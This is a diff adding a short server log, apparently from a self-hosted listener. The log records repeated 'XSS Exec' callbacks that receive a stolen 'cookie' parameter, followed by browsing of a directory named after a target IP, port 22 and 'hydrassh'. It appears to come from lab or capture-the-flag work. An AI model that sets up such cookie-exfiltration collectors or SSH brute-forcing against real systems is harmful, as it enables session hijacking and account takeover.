@@ -1,0 +1,22 @@
+2024-11-18 20:30:17,404 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:30:17,404 - 192.168.1.98 - - [18/Nov/2024 20:30:17] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:17,141 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:17,141 - 192.168.1.98 - - [18/Nov/2024 20:34:17] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:18,161 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:18,162 - 192.168.1.98 - - [18/Nov/2024 20:34:18] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:18,345 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:18,345 - 192.168.1.98 - - [18/Nov/2024 20:34:18] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:18,529 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:18,530 - 192.168.1.98 - - [18/Nov/2024 20:34:18] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:18,680 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:18,681 - 192.168.1.98 - - [18/Nov/2024 20:34:18] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:35,520 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:35,520 - 192.168.1.98 - - [18/Nov/2024 20:34:35] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:36,532 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:36,532 - 192.168.1.98 - - [18/Nov/2024 20:34:36] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:36,715 - XSS Exec with params: ImmutableMultiDict([('cookie', 'fgbnskdfgbksdfgkdsfgdskfjghsdfg')])
+2024-11-18 20:34:36,715 - 192.168.1.98 - - [18/Nov/2024 20:34:36] "GET /xss?cookie=fgbnskdfgbksdfgkdsfgdskfjghsdfg HTTP/1.1" 200 -
+2024-11-18 20:34:41,765 - 192.168.1.98 - - [18/Nov/2024 20:34:41] "GET /browse HTTP/1.1" 200 -
+2024-11-18 20:34:58,017 - 192.168.1.98 - - [18/Nov/2024 20:34:58] "GET /browse?dir=10.10.11.43 HTTP/1.1" 200 -
+2024-11-18 20:34:59,190 - 192.168.1.98 - - [18/Nov/2024 20:34:59] "GET /browse?dir=10.10.11.43/22 HTTP/1.1" 200 -
+2024-11-18 20:35:00,216 - 192.168.1.98 - - [18/Nov/2024 20:35:00] "GET /browse?dir=10.10.11.43/22/hydrassh HTTP/1.1" 200 -
